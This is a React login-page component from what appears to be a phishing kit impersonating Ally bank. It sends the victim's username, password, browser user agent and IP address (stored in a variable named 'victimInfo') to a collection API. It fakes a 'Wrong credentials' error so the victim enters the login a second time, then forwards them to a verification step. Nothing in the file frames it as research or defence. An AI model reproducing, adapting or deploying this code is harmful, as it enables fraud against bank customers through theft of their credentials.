import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { RiEyeLine, RiEyeOffLine } from "react-icons/ri";
import { IoEyeOutline, IoEyeOffOutline, IoEyeOff } from "react-icons/io5";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "Ally Online Services | Ally",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title="Login"
    >
      <Input
        title="Username"
        name="userID"
        value={data?.userID}
        onChange={handleChange}
      />
      <Input
        title="Password"
        type={!isShowPass ? "password" : "text"}
        name="password"
        value={data?.password}
        onChange={handleChange}
      >
        <span
          className="absolute top-8 right-2"
          onClick={() => setIsShowPass((prev) => !prev)}
        >
          {!isShowPass ? (
            <IoEyeOff
              fontSize={20}
              fill="#959595"
            />
          ) : (
            <IoEyeOffOutline
              fontSize={20}
              fill="#959595"
            />
          )}
        </span>
      </Input>
      {isWrong && (
        <div
          className="p-4 my-4 flex items-center gap-3 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            className="stroke-[#ce1616] shrink-0 w-6 h-6"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
            ></path>
          </svg>
          <span>Wrong credentials.</span>
        </div>
      )}

      <div className="flex items-center justify-between mb-3">
        <Button
          style={{ width: "max-content" }}
          disabled={isLoading}
          title="Log In"
        />
        <div className="flex gap-3 items-center">
          <input
            id="checkbox"
            type="checkbox"
            className="rounded-md border-[2px] size-5"
          />
          <label
            htmlFor="checkbox"
            className="font-[500] text-sm"
          >
            Save username
          </label>
        </div>
      </div>

      <p className="text-sm">
        Forgot{" "}
        <a
          href="#"
          className="text-[#0071c4]"
        >
          username
        </a>{" "}
        or{" "}
        <a
          href="#"
          className="text-[#0071c4]"
        >
          password
        </a>
        ?
      </p>
      <p className="text-sm">
        <a
          href="#"
          className="text-[#0071c4]"
        >
          Create a profile
        </a>{" "}
        to manage your account online
      </p>
    </FormLayout>
  );
};

export default Login;
